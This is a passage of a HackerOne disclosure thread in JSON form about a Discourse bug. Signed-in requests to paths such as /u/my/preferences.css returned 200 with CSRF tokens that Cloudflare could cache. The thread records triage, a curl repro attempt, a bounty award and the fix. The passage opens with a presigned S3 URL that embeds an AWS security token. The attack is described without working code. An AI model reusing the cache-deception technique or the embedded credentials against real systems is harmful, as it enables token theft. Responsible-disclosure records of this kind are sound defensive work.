ontent-disposition=attachment%3B%20filename%3D%22Screen_Shot_2018-01-14_at_23.44.58.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2018-01-14_at_23.44.58.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ2T6DG5UU%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T143230Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJIMEYCIQCyGt%2F6wKTb7WdhbTEehok3geSSNypgF1jy9glhzjfqmQIhAN%2FZ96OUsxT3l%2FcNh%2BJaiqKBQp%2B0XefuAf%2BhfC%2FmhMZBKoMECO%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5IgxZblqGtDqM2dUzvNgq1wMBRL4HwjcRdARKHRTYG1WTOwsUnNm5pyWIDl6UX7cxu3S9pxhLAGamITa%2Bry536DE0dNafGhdIyPeponbLp8FxjTVDEDmVrSlc3vq07ilX%2FsvaFMPbfLwUFwN8DcJVAZSLYZA6zDdeKNCgrZ1ISy%2BuSl%2F8sa9Nj%2FKFffdAxrEzWdcbmnUnTxt6PFvOqigHySvKHcRU1WUlzR%2BJNQhShWoYk3WMwt3lGEOyDeyEBa1PjWzXfwU5hwfOCygWSHeqe3rws%2Fy%2FAjcJ4Igs3dp7VWi2gpey9dMnBlv29eq43WYKyQ6K0q%2FC9l73EFZqlsoZAnNWCF%2BaMWp%2FSNCQCoi6LiyTT3H7xbPsVAE%2F%2B6%2B%2Fmd5o4HWlwOrPWTPapPHw%2BSF0OGtEIdy9BSNcjjpsTprmH3CxZWrOiVUBzDRDrImWT3QqtKWRETxE5UkMEesELPvS1Vr78fUKmIPG33W64ks49siCJg%2BYlvii52MslCAhwi8OBai4EvmsepnSL4Y7WjbGc31Zh7uWP1tOMXaSXgoK4ZXpbX9aNZgfinEq%2FEdjmz1acLqkVL8LTALuORrCaSQNzbL1VsrMHnDQY5Ip6UHG9W3WhTLOB2rMmAx%2FYtqF%2F2HrLRQRuA5lXPow%2F4aRiwY6pAFiuHIrJ99Gk48YedhIWLylCmpLudXTrjRTQ5%2BPJgz8sHy%2FJL%2BbYgchWh7RyeRvXCGWkecfBiAUWkHftxJlLxZP3R4oliu1hG1pnP80N0SBXLpKCFAQqqhncEnNPuXaqUaPMjKqpRRMw76WlTCCpu34SiacreJDZDO6dLymqMm3OX1OpD5Y13L2IbUTLcllZFway4EkA3FPk2PKaxAARwJYsWedpQ%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=9ceab29c9dceda26ef8737657f9c9b1d8d0bc755fde60bbdd6ce7dd802cb5794"}],"genius_execution_id":null,"team_handle":"discourse","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2304532,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Great find @fransrosen! We've escalated this to the development team to see if this is something they would like to fix, and will get back to you as soon as we have any updates.\n\nKind regards,\n@asuka ","automated_response":false,"created_at":"2018-01-21T09:37:15.700Z","updated_at":"2018-01-21T09:37:15.700Z","actor":{"username":"asuka","cleared":false,"url":"/asuka","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/111/923/28e02b13f94679bbda8c7d3b7390776d8977f1b6_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"discourse","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2340463,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"We view this as low priority but we do eventually want to make it so bad .css requests don't return 200.\n\n\u003e The reason why all this works to refresh everyones memory on this bug, is that any path under `/u/*.css` will respond when signed in with CSRF-tokens in the error page","automated_response":false,"created_at":"2018-01-31T22:24:55.285Z","updated_at":"2018-01-31T22:27:01.875Z","actor":{"username":"discourse_team","cleared":false,"url":"/discourse_team","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/130/970/7a0cbe82b76df13bcdbf07365f42abe856650525_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"discourse","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2340464,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","automated_response":false,"created_at":"2018-01-31T22:25:09.199Z","updated_at":"2018-01-31T22:25:09.199Z","additional_data":{"old_severity":null,"new_severity":"Low","old_severity_id":null,"new_severity_id":114176},"actor":{"username":"discourse_team","cleared":false,"url":"/discourse_team","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/130/970/7a0cbe82b76df13bcdbf07365f42abe856650525_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"discourse","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2340637,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"We are not sure we can repro this? We are hitting `try.discourse.org/u/samsaffron/activity.css` and getting a response code of 406?\n\n```\njeff@WUMPUS:~$ curl -I https://try.discourse.org/u/samsaffron/activity.css\nHTTP/1.1 406 Not Acceptable\nServer: nginx/1.13.6\nDate: Wed, 31 Jan 2018 23:24:57 GMT\nContent-Type: text/html; charset=utf-8\nContent-Length: 0\nConnection: keep-alive\nX-Request-Id: c2757c97-24a1-484c-97a3-56d203acf8a5\nX-Runtime: 0.024248\nDiscourse-Proxy-ID: app-router-tiehunter01\nStrict-Transport-Security: max-age=31415926\n```\n\nIs the report specific to the redirect routes `/users` and `/my` then?","automated_response":false,"created_at":"2018-01-31T23:27:31.070Z","updated_at":"2018-01-31T23:27:31.070Z","actor":{"username":"discourse_team","cleared":false,"url":"/discourse_team","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/130/970/7a0cbe82b76df13bcdbf07365f42abe856650525_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"discourse","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2343125,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"We agree this was effectively a bug, we should not be returning 200 OK plus auth tokens for random URLs such as\n\n```\n/u/my/preferences.css\n/u/my/preferences/username.css\n/u/my/preferences/card-badge.css\n```\n\nAlthough the impact is low (effectively CloudFlare specific) I am awarding at the medium level because this was such a well written and researched report -- thank you!\n\nThis is also fixed in master / latest.\n","automated_response":false,"created_at":"2018-02-01T21:29:02.981Z","updated_at":"2018-02-01T21:29:41.834Z","actor":{"url":"/discourse","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/016/893/0bc08a2076b0f1f4a2c58636b8171b32cc367a52_original./fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Discourse"}},"bounty_amount":"256.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"discourse","collaborator":{"username":"fransrosen","url":"/fransrosen"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2343837,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"Thank you!\nI haven't confirmed the fix yet but I have seen fixes been done by always serving Cache-Control: no-cache whenever the current user is signed in, as some cache settings in Cloudflare also allows caching 404 responses if no cache-header is present.\n\nGreat job, glad that it could get solved, sorry for the long delay of getting a proper PoC.","automated_response":false,"created_at":"2018-02-02T04:28:31.142Z","updated_at":"2018-02-02T04:28:31.142Z","actor":{"username":"fransrosen","cleared":true,"url":"/fransrosen","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/634/6569f1cff6ac26c01a91db469d8707228965f09f_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"discourse","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2343918,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","automated_response":false,"created_at":"2018-02-02T06:11:25.477Z","updated_at":"2018-02-02T06:11:25.477Z","actor":{"username":"discourse_team","cleared":false,"url":"/discourse_team","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/130/970/7a0cbe82b76df13bcdbf07365f42abe856650525_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"fransrosen","url":"/fransrosen"},"genius_execution_id":null,"team_handle":"discourse","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3019401,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2018-07-09T18:00:09.615Z","updated_at":"2018-07-09T18:00:09.615Z","first_to_agree":true,"actor":{"username":"fransrosen","cleared":true,"url":"/fransrosen","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/634/6569f1cff6ac26c01a91db469d8707228965f09f_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"discourse","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3162622,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2018-08-08T18:00:12.277Z","updated_at":"2018-08-08T18:00:12.277Z","actor":{"url":"/discourse","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/016/893/0bc08a2076b0f1f4a2c58636b8171b32cc367a52_original./fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Discourse"}},"genius_execution_id":null,"team_handle":"discourse","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}